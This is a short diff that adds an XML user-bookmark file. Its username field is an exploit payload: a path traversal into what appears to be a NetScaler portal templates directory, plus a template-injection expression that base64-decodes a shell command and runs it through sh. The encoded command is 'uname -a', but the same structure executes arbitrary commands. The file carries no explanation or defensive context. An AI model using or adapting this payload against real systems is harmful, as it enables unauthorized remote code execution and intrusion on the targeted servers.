@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<user username="../../../netscaler/portal/templates/hgvytdss[%template.new('BLOCK'='print `echo dW5hbWUgLWE= | openssl enc -base64 -d| sh`')%]">
+  <bookmarks></bookmarks>
+  <escbk>
+  </escbk>
+  <filesystems></filesystems>
+  <style theme="" />
+</user>
